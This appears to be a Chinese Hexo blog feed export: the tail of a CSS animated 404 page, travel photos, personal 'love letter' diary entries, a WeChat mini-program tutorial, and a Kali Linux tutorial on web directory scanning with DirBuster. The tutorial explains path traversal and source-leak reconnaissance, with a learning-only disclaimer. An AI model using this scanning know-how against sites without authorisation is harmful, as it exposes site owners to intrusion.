<span class="number">0</span> <span class="number">#FD79A8</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">50%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">                        inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#EC3E27</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66,</span></span><br><span class="line"><span class="css">                        inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#FD79A8</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> -<span class="number">30px</span> <span class="number">0</span> <span class="number">#0984E3</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">75%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">                        inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#FD79A8</span>66,</span></span><br><span class="line"><span class="css">                        inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#0984E3</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> -<span class="number">30px</span> <span class="number">0</span> <span class="number">#EC3E27</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">100%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">box-shadow</span>:</span></span><br><span class="line"><span class="css">                        inset <span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#FD79A8</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> <span class="number">30px</span> <span class="number">0</span> <span class="number">#0984E3</span>66,</span></span><br><span class="line"><span class="css">                        inset -<span class="number">30px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">#EC3E27</span>66,</span></span><br><span class="line"><span class="css">                        inset <span class="number">0</span> -<span class="number">30px</span> <span class="number">0</span> <span class="number">#D0FFc6</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 左侧文字效果：分四次将当前文字颜色变换为 左侧内阴影的颜色 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation</span>: animate_span_1 <span class="number">5s</span> linear infinite;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/*动画 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="keyword">@keyframes</span> animate_span_1&#123;</span></span><br><span class="line"><span class="css">            <span class="number">0%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#FD79A8</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">25%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#0984E3</span>66</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">50%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#EC3E27</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">75%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#D0FFc6</span>66</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">100%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#FD79A8</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/* 右侧文字效果：分四次将当前文字颜色变换为 右侧内阴影的颜色 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="selector-class">.container</span> <span class="selector-tag">span</span><span class="selector-pseudo">:nth-child</span>(<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">animation</span>: animate_span_3 <span class="number">5s</span> linear infinite;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="comment">/*动画 @Arvin */</span></span></span><br><span class="line"><span class="css">        <span class="keyword">@keyframes</span> animate_span_3&#123;</span></span><br><span class="line"><span class="css">            <span class="number">0%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#FD79A8</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">25%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#D0FFc6</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">50%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#EC3E27</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">75%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#0984E3</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">            <span class="number">100%</span>&#123;</span></span><br><span class="line"><span class="css">                <span class="attribute">color</span>: <span class="number">#FD79A8</span>66;</span></span><br><span class="line"><span class="css">            &#125;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;channel&quot;</span>&gt;</span></span><br><span class="line">    TCT 代码中遇见二次元 🤍</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>4<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;middle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>4<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Page </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021.10.08日本记</title>
      <link href="/2021/10/08/img_rb_xiaoj_2021.10.08.01/"/>
      <url>/2021/10/08/img_rb_xiaoj_2021.10.08.01/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>东皇将逝，我已寻她千百度，蓦然回首，向黄昏许愿，等风起，等花开，等我们相遇</strong></p></blockquote><hr><p><img src="https://z3.ax1x.com/2021/10/08/5P0oNt.jpg" alt="山林小街"><br><img src="https://z3.ax1x.com/2021/10/08/5P0IAI.jpg" alt="京都盛景"><br><img src="https://z3.ax1x.com/2021/10/08/5P04HA.jpg" alt="夜池孤影"><br><img src="https://z3.ax1x.com/2021/10/08/5P0fnH.jpg" alt="世隐谷亭"><br><img src="https://z3.ax1x.com/2021/10/08/5P0Rje.jpg" alt="孤月"><br><img src="https://z3.ax1x.com/2021/10/08/5P0Ljg.jpg" alt="闪耀"><br><img src="https://z3.ax1x.com/2021/10/08/5P0qgS.jpg" alt="东京塔"><br><img src="https://z3.ax1x.com/2021/10/08/5P0b38.jpg" alt="仙珠"><br><img src="https://z3.ax1x.com/2021/10/08/5P0XuQ.jpg" alt="清雅"></p>]]></content>
      
      
      <categories>
          
          <category> 小记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本风景 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】致未来的你，情书Ⅲ</title>
      <link href="/2021/10/08/epistle.2021.10.08.01/"/>
      <url>/2021/10/08/epistle.2021.10.08.01/</url>
      
        <content type="html"><![CDATA[<p>夜已深，心却一点都不静。如果是你，我就和你说说话，唠唠嗑，聊聊天。因为，除了你，没有人会在意也没有人会关心，心，怎么了。也没有人会了解。和大部分人说话，是一件很浪费心力和时间的事情，因为他们的眼里，是看不见别人的。沟通，聊天，但是不会产生了解。他不知道你说这件事情，究竟在说什么，他不了解，你内心的情绪和想法。如果是你，就会很不一样吧。我应该会很喜欢和你说话，大大小小的事情，芝麻绿豆的事情，说着说着，或者没说，看见你，就哭花了脸，你也不会慌张，也不会问我怎么了，你只要温柔的看着我哭，陪着我就好了。</p><p>我醒来，我就觉得好难受。我也不知道为什么。我不知道是心里有什么东西在消融，冰冻的部分在一点点融化，还是发生了什么，我不知道发生了什么，但是我会觉得心绪很不安宁，也或者大姨妈要来了。不过对我来说，这种不正常和波动，是一种正常。我时常这样抽风一下，莫名的就觉得烦躁，不不舒服，什么都不想做，这是一种病。如果是你，你大概会说，没关系呀，你有病，我有药。哈哈。是呀，你可以像撸猫咪一样，撸我，我们就这样静静的待着，坐着，靠着，或躺着。我相信，如果是你，待在你身边，就会觉得很安宁。</p><p>干儿子生日，闺蜜张罗了一个专业拍照的，喊着一些邻居的小朋友，同学。在楼下小区的花园里，草地上，准备切蛋糕。我儿子一个人上楼打游戏。闺蜜问他怎么了。闺蜜总是觉得我对孩子没有约束，没有规矩，太过宠溺。我跟前夫关于孩子的教育也有很多不同的意见。我内心深知，这孩子携带的家族能量有多负面，脾气有多大，我不愿意强迫孩子做什么，我希望给他尽可能多的空间，他们都觉得我没有底线，或者说我的底线太底线。呵呵。。。当周围的人，不断质疑你的时候，你会怀疑吗，你会犹豫吗。我知道，如果是你，你不会的。你内心是有力量的，只要是你认定的，只要是你心里笃信的，别人或周围的任何，都不可能产生什么影响的。我重来不会抗拒和否认他们任何人的观念和想法，我总是表示，你们可以用任何你们觉得对的方式对待孩子，为什么不可以呢，为什么总是要分出个是非对错呢，如果我们无法在某些认知上达成共识，为什么我们不可以用彼此觉得合适的方式，各自去做呢。有时候我会觉得委屈，我也会很傲娇，我觉得我能看到他们看不到的未来，尽管有时候，我也会觉得很烦，不愿意解释，不愿意争论争辩，但是我心里也是清楚的，我知道要怎样对待孩子。我也知道我自己的做法，在更长远的未来，对孩子是有帮助的。你呢，我知道，你不会参与这些，你甚至也不会教导我应该如何，不应该如何。你大概只会很笃定的告诉我，你信任我，也让我信任我自己。</p><p>我感受不到快乐。我和他们在一起，我跟家人在一起，我觉得有点别扭。我特别想要逃离，我想一个人待着。我刚才突然在想，如果你一直都不出现，也许某天，我可能真的找个深山啥的去待待吧。哈哈。虽然我很渴望，和人，和别人有很深的连接，有很深的关系。可是我没有那种感觉。闺蜜的奶奶去世了，我去陪夜，去参加葬礼，我YY着，我身边最亲近的人去世，我没有什么感觉。我也不知道，那种感觉是冻住了，还是我真的少一些什么。我有时候会觉得很累。因为他们都有他们对世界的认知，应该怎样应该怎样。。。所有的言行都会包含这样的控制的能量，这让我觉得不放松，不舒服。我显得如此格格不入。因为我不在他们所有的应该之中。哈哈。。。活了那么久，我仿佛离他们越来越远。可是，这样会离你更近吗？</p><p>我又暴饮暴食，我觉得我又胖了。一直都没有瘦。回国之后，就没瘦。时常暴饮暴食。我知道，我是不愿意面对自己的，我总觉得我还没有做好准备。面对自己，真的需要很多能量呀，我有时候什么都不想做，也不愿意做。阿卡西记录的课程上完都有两个月了，我也没怎么做练习。我知道我有一切的资源和方法和工具，去解决我自己的问题，我就是不愿意面对，我觉得我还没有准备好，我不敢，我没有勇气，我也没有能量。你看，我什么都没有做，我只是做了一点点，前段时间多做了几次能量疗愈，做了几次舞动静心，我还是能感觉到身体的动荡和释放，我还是会觉得好困难，我觉得面对自己，拆解自己，真的，没人知道，但是内心就是波澜壮阔，波涛汹涌，不会游泳，分分钟钟，时常被呛水被淹没，越挣扎还越下沉。我知道，把现在的一切敲碎，剥离，会很不一样，我会遇见也许我从未遇见过从未了解过的自己，可是这个过程真的好难，迈出第一步都好难。我甚至有时候在想，上帝是不是把你安排在这些关卡之后呢，我是不是要通关这个部分，才会遇见你呢。我身边没有什么长久的关系，也没有什么深入的关系，很多人，都像过客，来来去去。是不是因为我自己也没有什么耐心，我对待自己也没有足够的耐心。上帝一定觉得，现在的我，还不到时间遇见你吧，因为遇见了，以我们现在的能力，也无法长久的彼此陪伴吧。可是，坦白说，如果真的是这样，我也生不起，为了遇见你，而让自己快速的变得更好的欲望。哈哈。。。我没有那样的欲望，我会想要让自己好一点，更好一点，不要暴饮暴食，好好关照身体，但是也只是我有这样的念头，这种念头都时常在飘忽，都没有什么稳固，也谈不上非要如此。刚才洗澡的时候，还在想，如果余生，只做一件事，就是把身体这座庙宇好好修缮，估计也是很有意思的，我也可以成为某个匠人，在这件事上，成为专家。可我也就这样想想。你说，为什么我那么没有行动力。你会告诉我，不用担心这个，不是所有人都需要有行动力的，没有就没有，做好眼前每一件事就可以了。你一定会告诉我，如果你在，你就会安顿好我的心，心安定了，然后就享受每一件事就可以，就那么简单，没有那么复杂的。你一定会告诉我，让我的脑子里，想着你就可以了，不用想其他乱七八糟的事情。这个对白好熟悉呀，我曾经梦到过。你呢，你梦到过吗？你还会跟我说，如果下次再想乱吃东西，就找你说话吧。食物只是情绪的安慰剂，而如果有你，我大概就不需要别的安慰剂了，你就是最好的药了。</p><p>嗯，吃一颗，YY你的药。然后乖乖睡觉。</p><p>不管怎样，我都要自己生长出一点能量，关照好自己的身体，起码要等到，遇见你的那天。</p><p>你会不会，有一天，看完我写给你的情书，</p><p>然后跟我说，傻瓜，我来了，虽然晚了一点，人间交通太拥挤，不过，我还是来了。而且，我知道，你等的就是我。因为我来自我们的未来。</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。</strong></p><p><strong>致敬未知。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 书信 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小柔书信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序结构目录</title>
      <link href="/2021/10/08/wx_AppletsStructureDirectory/"/>
      <url>/2021/10/08/wx_AppletsStructureDirectory/</url>
      
        <content type="html"><![CDATA[<h2 id="微信小程序结构目录"><a href="#微信小程序结构目录" class="headerlink" title="微信小程序结构目录"></a>微信小程序结构目录</h2><blockquote><p><strong>微信小程序框架</strong>的目标是通过尽可能简单、高效的方式让开发者可以在微信中开发具有原生 App 的体验的服务。</p><p>小程序框架提供了自己的视图层描述语言 <strong>WXML</strong> 和 <strong>WXSS</strong> ,以及 <strong>JavaScript</strong> ，并在视图层与逻辑层间提供了数据传输和事件系统，让开发者能够专注于数据与逻辑。</p></blockquote><hr><h3 id="小程序文件结构和传统-Web-对比"><a href="#小程序文件结构和传统-Web-对比" class="headerlink" title="小程序文件结构和传统 Web 对比"></a>小程序文件结构和传统 Web 对比</h3><table><thead><tr><th align="center">结构</th><th align="center">传统 Web</th><th align="center">微信小程序</th></tr></thead><tbody><tr><td align="center">结构</td><td align="center">HTML</td><td align="center">WXML</td></tr><tr><td align="center">样式</td><td align="center">CSS</td><td align="center">WXSS</td></tr><tr><td align="center">逻辑</td><td align="center">JavaScript</td><td align="center">Java script</td></tr><tr><td align="center">配置</td><td align="center">无</td><td align="center">JSON</td></tr></tbody></table><p>通过以上对比得出，<strong>传统 Web</strong> 是三层结构。而微信小程序是四层结构，多了一层 <strong>配置.json</strong></p><hr><h3 id="基本的项目目录"><a href="#基本的项目目录" class="headerlink" title="基本的项目目录"></a>基本的项目目录</h3><p><img src="https://z3.ax1x.com/2021/10/08/5P3C9A.png" alt="微信小程序结构目录"></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> 微信小程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali-Linux 目录扫描 Dirbuster</title>
      <link href="/2021/10/05/kali-LinuxDirectoryscan_Dirbuster/"/>
      <url>/2021/10/05/kali-LinuxDirectoryscan_Dirbuster/</url>
      
        <content type="html"><![CDATA[<h2 id="Kali-Linux-目录扫描-Dirbuster"><a href="#Kali-Linux-目录扫描-Dirbuster" class="headerlink" title="Kali Linux 目录扫描 Dirbuster"></a>Kali Linux 目录扫描 Dirbuster</h2><blockquote><p><strong><code>注意本资料只适用学习研究，禁止进行非授权活动。请熟读网络安全法条规</code></strong></p></blockquote><p><code>Lali Linux 系列第四篇信息收集第四章 目录扫描 Dirbuster</code></p><h3 id="目录扫描的作用"><a href="#目录扫描的作用" class="headerlink" title="目录扫描的作用"></a>目录扫描的作用</h3><p><strong>文件目录</strong></p><blockquote><p>文件目录是指：为实现 “按名存取”，必须建立文件名与辅存空间中物理地址的对应关系，体现这种对应关系的数据结构称为文件目录。</p></blockquote><p><strong>目录扫描</strong></p><blockquote><p>目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构。</p><p>通过目录扫描我们还可以扫描敏感文件，后台文件，数据文件，和信息泄露文件等等</p><p><strong>目录扫描是信息收集技术的重要部分</strong></p></blockquote><hr><h3 id="常见的目录信息泄露"><a href="#常见的目录信息泄露" class="headerlink" title="常见的目录信息泄露"></a>常见的目录信息泄露</h3><p><strong>目录遍历漏洞</strong></p><blockquote><p>目录遍历（路径遍历）是由于 Web 服务器或者 Web 应用程序对用户输入的文件名称的安全验证不足而导致的一种安全漏洞，使得攻击者可以通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以使 Web 根目录以外的文件），甚至执行系统命令。</p></blockquote><p><strong>目录遍历漏洞原理</strong></p><blockquote><p>程序在实现上没有充分过滤用户输入的 ../ 之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p></blockquote><hr><p><strong>敏感信息泄露</strong></p><blockquote><p><strong><code>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易访问到</code></strong></p></blockquote><p><strong>例如</strong>：</p><blockquote><ul><li>通过访问 url 下的目录，直接可以列出目录下的文件列表；</li><li>输入错误的 url 参数后报错信息里面包含操作系统、中间件、开发语言的版本或者其他信息（SQL 注入）；</li><li>前端的源码（html 、Css 、Js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账户密码等；</li></ul></blockquote><hr><h3 id="常见的源码泄露案例"><a href="#常见的源码泄露案例" class="headerlink" title="常见的源码泄露案例"></a>常见的源码泄露案例</h3><p><strong>目录遍历</strong></p><blockquote><p>当没有默认网页时，在网站上显示 WEB 服务器显示用户列表中的文件和目录，在 apahce 服务器上面默认文化名为 Index.php，当没有上传 index.php 时，服务器就会将文件夹中的内容全部展示出来。</p></blockquote><p><strong>实例</strong></p><blockquote><p><strong><code>攻击者浏览目录并访问 Web 应用程序的源代码，备份和可能的数据库文件。</code></strong></p></blockquote><p><strong>源码泄露案例</strong>：<a href="http://www.sohu.com/a/192064346_653604">链接</a></p><hr><p><strong>Git 源码泄露</strong></p><blockquote><p><strong>漏洞成因</strong>：<br>在允许 Git init 初始化代码库的时候，会在当前目录下面产生一个 Git 的隐藏文件，用来记录代码的变更记录等。在发布代码的时候，把这个 Git 目录没有删除，直接发布了。使用这个文件，可以用来回复源代码。</p><hr><p><strong>漏洞利用</strong>：</p><p>工具：GitHack</p></blockquote><p><strong>DS_Store 文件泄露</strong></p><blockquote><p><strong>漏洞成因</strong>：</p><p>在发布代码时未删除文件夹中隐藏的 DS_Store，被发现后，获取了敏感的文件名等信息。</p><hr><p><strong>漏洞利用</strong>：</p><p><a href="http://example.com/ds_store">实例网址</a></p></blockquote><p><strong>网站备份压缩文件</strong></p><blockquote><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 Web 目录下，该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p><strong>该漏洞的成因主要有以下两种</strong>：</p><ul><li>服务器管理员错误的将网站或者网页备份文件放置到服务器 Web 目录下</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在 Web 目录下。</li></ul></blockquote><hr><h3 id="常见的目录扫描方式"><a href="#常见的目录扫描方式" class="headerlink" title="常见的目录扫描方式"></a>常见的目录扫描方式</h3><ul><li><strong>Robots.txt</strong></li></ul><blockquote><p>网站内的 Robtos 文件</p></blockquote><ul><li><strong>目录爆破</strong></li></ul><blockquote><p>御剑</p><p>Nikto</p><p>Dirbuster （推荐）</p><p>Webdirscan</p><p>自制字典</p><p>等工具</p><p><strong>都是通过字典、枚举进行爆破</strong></p></blockquote><ul><li><strong>第三方资源引用</strong></li></ul><blockquote><p>JS</p><p>外部链接</p><p>内部链接</p><p>SDK （第三方软件开发工具包）</p></blockquote><h3 id="目录扫描工具-Dirbuster"><a href="#目录扫描工具-Dirbuster" class="headerlink" title="目录扫描工具 - Dirbuster"></a>目录扫描工具 - Dirbuster</h3><p><strong>工具说明</strong>：</p><blockquote><p><strong>Owasp 项目</strong></p><hr><p><strong>DirBuster</strong> 是一个多线程的基于 <strong>Java</strong> 的应用程序设计用于暴力破解 <strong>Web</strong> 应用服务器上的目录名和文件的工具</p><p><strong>工作原理</strong></p><hr><p><strong>DirBuster</strong> 是一种履带式（遍历）和粗暴式（爆破）的混合物；</p><p>它遵循它找到的页面中的所有链接，但也为可能的文件尝试不同的名称。这些名称可能位于与我们使用的文件类型的文件中，也可能由 <strong>Dirbuster</strong> 使用 <strong>Pure Brute Force</strong> 选项自动生成（暴力破解），并设置字符集以及生成的单词的最小和最大长度（撞库字典）。</p><p>为确定文件是否存在，<strong>DirBuster</strong> 使用服务器的响应代码。最常见的响应如下：</p><ul><li>200 ok ：文件存在</li><li>404 找不到 404 文件 ：服务器中不存在该文件</li><li>301 301永久移动 ：这是重定向到给定的 URL</li><li>302 302永久移动 ：这是重定向到给定的 URL</li><li>401 Unauthorized ：访问此文件需要身份验证</li><li>403 Forbidden ：请求有效但服务器拒绝响应</li><li>5 开头表示服务器存在问题</li></ul><p><strong><code>DirBuster，它是用来探测 Web 目录结构和隐藏的敏感文件的</code></strong></p></blockquote><hr><p><strong>环境配置</strong>：</p><blockquote><p><strong>使用需求</strong>：</p><p><strong>DirBuster</strong> 是基于 <strong>Java</strong> 的应用程序需要 <strong>Jre</strong> 环境</p><p>Java环境下载：<a href="https://www.java.com/zh_Cn">加载器</a></p><p><code>安装过程中一定要勾选 &quot;add to path&quot; (添加环境变量)</code> </p><hr><p><strong>DirBuster</strong> 下载地址：<a href="https://sourceforge.net./projects/dirbuster/files/">下载地址</a></p><p><strong>安装</strong>：</p><p>Windows 双击 DirBuster.jar 启动软件</p><p>Linux 用户在命令行运行：./DirBustet-1.0-RC1.sh</p><p>Linux 若脚本无执行权限使用：chmod + x./Dirbuster-1.0-RC1.sh 添加权限</p></blockquote><p><strong>工具使用介绍</strong>:</p><p><img src="https://z3.ax1x.com/2021/10/05/4jPnpT.png" alt="DirBustet"></p><p><strong>具体操作步骤</strong>：</p><ul><li>URL 设置</li><li>线程数设置</li><li>选择爆破字典</li><li>取消选择递归查询</li><li>开始运行</li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>如果你担心工具有病毒可以采用腾讯的一些工具进行检测</strong></p><p>腾讯检测工具链接：<a href="https://habo.qq.com/tool/index/">链接</a><br>SHODAN ：摄像头监控工具</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教学文档 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【無憂樹洞】致未来的你，情书Ⅱ</title>
      <link href="/2021/10/02/epistle.2021.10.02.01/"/>
      <url>/2021/10/02/epistle.2021.10.02.01/</url>
      
        <content type="html"><![CDATA[<p>最近一直有这样的念头，要写这样一封情书，给你。</p><p>我也不知道为什么，难道你在某个未知的地方，等着我的这些信息，然后终于寻到，等到彼此吗？</p><p>只是，这个念头，出现了好些日子，一直都没有消散，于是，我想，那就写写吧，毕竟也是一种能量的流动。能量，也没有什么时间和空间，也会反作用在我自己的身上。</p><p>打下这个标题的时候，我是真的写了又删，删了又写。最后还是不免俗套的，起了个很俗很接地气的标题。哈哈。情书是个多美好的字眼。</p><p>其实我知道，你并不在未来，我原本用的是未知，我想你一定是存在的，只是我还不知道。曾经，或者现在，或者未来，如果我们能认出彼此，就一定会知道，我们之间的缘分，一定不是只有这一世那么单薄。所以我想你不仅仅只是未来的。可是我不知道，这一世，你是什么样子，好像未来这个词更可以靠近你。更可以宣示一种，当下没有的状态。哈哈。。</p><p>我是特别的，所以我想，你也一定是独特的。而这样与众不同的气息，在对的人那里，是不是一眼就可以认出，就可以嗅到。我相信，”你给的，正好是我想要的；你说的，恰好我懂”这种默契和灵犀，是写好的剧本，只是我们需要合适的契机，来遇见罢了。</p><p>我有过一段将近十年的婚姻，我知道，这是我必须要经历的剧情。</p><p>而如果是你，你会知道，这个姑娘，原来还一直未长大。你会愿意看着她，陪着她，把那些没有做完的事情，统统做一遍，把那些遗留下来的坑，一个一个填上。在你眼里，只有了解之后的疼惜吧。所以，这是你和别人不同的地方吧。</p><p>我遇见过很有爱的人，内心是善良的，不会吝啬表达爱，也总是会说要相互了解，要共同成长，要一起学习。可是当我望向他的时候，他的眼里没有对于一个人的探索的兴趣，也没有写满的欣赏。我知道，他不是你。</p><p>我遇见过有很深很深的伤痕的人，他们陷在自己的伤痛中，甚至可能都看不见自己的伤痕，在自己的世界里，自己出不来，别人也进不去。这样的人，其实很有生命力，也很有能量，甚至很有爱。但是这些都仿佛冰冻住一样，需要合适的人，来溶解。如果不是我，那么我想，他也不是你。</p><p>我遇见过内心对于爱还有期待，还有幻想的人，但是由于惯性，他们有太多的不安和恐惧。习惯了一个人的生活，一个人的日子，开始觉得恋爱也是麻烦的。渴望被了解，渴望被懂得，却未必渴望相爱。哈哈。。想要开始一段新的感情，又会觉得各种麻烦，各种不安，缩回自己的壳里。习惯是容易的，改变总是困难的。我也不愿意改变这种从形式到内心都是单身的状态，我也觉得恋爱是一件很麻烦的事情，我也知道，关系，亲密关系总是会牵扯出太多的动荡和功课，可是，如果真的是你，我想，我还是会愿意去面对的。</p><p>我不会跟你说，我要怎样怎样。。。让自己成为更好的自己，然后遇见你的时候就怎样怎样，哈哈。。我不是那种妹子。我们可以不用更好，但是需要更真实。我们可以不用追逐任何外在的一切，但是需要内心更有力量。当我自己的能量不足以安定自己的时候，我会觉得，想到你，想到有一个你，一定在某个地方，可以借你的能量来用用。</p><p>为了讨你欢心，做你喜欢的事情；为了你的爱，成为你想要的样子；为了在一起，模糊了自己；这些都不是我们之间的关系和爱情。</p><p>你是你的样子，我是我的样子，看见或知晓，就足够欢喜。</p><p>我们会支持彼此，成为彼此应该是的样子。</p><p>我们会了解和懂得，彼此说了或没有说的言语和情感。</p><p>我们会一起成长，成为真正的成年人。我们也会一直宠溺彼此内心的孩子和童真。</p><p>你懂得，需求的爱与存在的爱，是不同的。</p><p>我们会愿意也会慢慢有能力给予彼此存在的爱与陪伴。</p><p>关系是一场未知的冒险，我们会有足够的耐心，勇气，陪伴和支持彼此，穿越过往，再次生长。</p><p>我不知道，你在哪里，何时会示现。</p><p>我只是相信，你在的吧。</p><p>我也相信，如果是你，来了，就不会走。</p><p>我只是愿意，如果是你，我们再谈一场恋爱。爱情多美好~</p><hr><p><strong>我只是在呢喃自语，</strong></p><p><strong>如果你看了，就已经是一种见证和陪伴了，</strong></p><p><strong>因为我知道一定会有人看。</strong></p><p><strong>如果有什么信息能和你共鸣，</strong></p><p><strong>你从中看见了自己，</strong></p><p><strong>那就是另外的收获了。</strong></p><p><strong>如果你看懂了，</strong></p><p><strong>你从中看见了我，</strong></p><p><strong>还能有什么回应，</strong></p><p><strong>并且这回应我们还可以彼此共振，</strong></p><p><strong>那就是更大的惊喜了。</strong></p><p><strong>没有无缘无故的遇见。<